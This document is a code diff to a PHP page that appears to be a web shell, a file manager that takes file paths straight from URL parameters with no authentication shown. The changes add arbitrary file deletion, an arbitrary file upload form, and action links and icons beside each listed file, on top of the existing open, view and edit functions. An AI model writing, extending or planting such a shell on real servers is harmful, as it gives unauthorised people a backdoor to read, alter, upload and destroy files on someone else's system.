@@ -133,12 +133,17 @@ body {
 	#textarea {
 	background: transparent;
 	width: 1066px;
+	font-family: 'Orbitron';
 	height: 500px;
 	font-family: Arial, Helvetica, monospace;
 	color:lavender;
 	}
 	#menu {}
 	*{font-family: 'Orbitron';}
+	.icon {
+		width:20px;
+		height:20px;
+	}
 	</style>
 	</head>
 	<body>
@@ -312,6 +317,13 @@ elseif ($_GET['do'] == 'open' and isset($_GET['dir'])) {
 elseif ($_GET['do'] == 'view' and isset($_GET['files'])) {
 	open($_GET['files']);
 }
+elseif($_GET['do'] == 'delete' and isset($_GET['files'])) {
+	if(@unlink($_GET['files'])) {
+		alert("Success");
+		} else {
+		alert("Permission Denied");
+	}
+}
 $dir = scandir(getcwd());
 foreach ($dir as $dir):
 ?>
@@ -326,18 +338,50 @@ foreach ($dir as $dir):
 	}
 	$ext = pathinfo($dir, PATHINFO_EXTENSION);
 	if (is_dir($dir)) {
-		echo "<td><a href='?do=open&dir=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
+		echo "
+		<td><img src='http://icons.iconarchive.com/icons/dakirby309/simply-styled/256/Blank-Folder-icon.png' class='icon'>";
+		echo "<a href='?do=open&dir=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
+		echo "<td style='float:right;'>
+		<a href='?'>Chmod | </a>
+		<a href='?'>Rename | </a>
+		<a href='?'>Downlod | </a>
+		<a href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
 	}
 	elseif ($ext == 'jpg' OR $ext == 'png' OR $ext == 'jpeg' OR $ext == 'gif' OR $ext == 'rar' OR $ext == 'zip' OR $ext == 'doc' OR $ext == 'pdf') {
-		echo "<td><a style='color:green' href='?do=view&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
+		echo "<td><img src='http://icons.iconarchive.com/icons/untergunter/leaf-mimes/512/text-plain-icon.png' class='icon'>";
+		echo "<a style='color:green' href='?do=view&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
+		echo "<td style='float:right;'>
+		<a href='?'> Chmod | </a>
+		<a href='?'>Rename | </a>
+		<a href='?'>Downlod | </a>
+		<a href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
 	}
 	else {
-		echo "<td><a style='color:green' href='?do=edit&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
+		echo "<td><img src='http://icons.iconarchive.com/icons/untergunter/leaf-mimes/512/text-plain-icon.png' class='icon'>";
+		echo "<a style='color:green' href='?do=edit&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
+		echo "<td style='float:right;'>
+		<a href='?'> Chmod | </a>
+		<a href='?'>Rename | </a>
+		<a href='?'>Downlod | </a>
+		<a href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
 	}
 ?>
 	</tr>
 </table>
 <?php
 endforeach;
+if(isset($_POST['upl'])) {
+if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
+	alert("Upload Success");
+	} else {
+		alert("Upload Failed");
+	}
+}
 ?>
+<p>
+<center>
+<form method="post" enctype="multipart/form-data">
+<input type="file" name="file" size="50">
+<input class="btn btn-danger" name="upl" type="submit">
+</form>
 </body>
